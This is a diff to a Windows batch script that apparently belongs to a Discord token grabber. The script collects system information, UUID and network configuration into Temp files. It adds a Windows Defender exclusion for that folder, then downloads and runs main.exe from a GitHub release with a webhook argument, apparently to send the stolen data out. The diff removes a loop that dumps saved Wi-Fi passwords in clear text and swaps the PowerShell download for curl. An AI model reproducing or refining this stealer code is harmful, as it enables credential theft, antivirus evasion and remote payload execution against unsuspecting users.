@@ -16,9 +16,6 @@ echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
 wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt
 systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt
 wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
-for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
-    netsh wlan show profile %%a key=clear >>%userprofile%\AppData\Local\Temp\wlan.txt
-)
 :aftertesti
 ::gets the ipconfig (also local ip)
 ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt
@@ -56,7 +53,7 @@ echo anti DiscordTokenProtector by https://github.com/baum1810  >>%userprofile%\
 cd %userprofile%\AppData\Local\Temp
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
 :: FULL SRC FOR THE EXE IS ON MY GITHUB!!!
-powershell -Command "Invoke-WebRequest https://github.com/KDot227/Batch-Token-Grabber/releases/download/V1.1/main.exe -OutFile %userprofile%\AppData\Local\Temp\main.exe"
+curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V1.1/main.exe --output %userprofile%\AppData\Local\Temp\main.exe
 :: FULL SRC FOR THE EXE IS ON MY GITHUB!!!
 timeout 3 >NUL
 start main.exe %webhook%
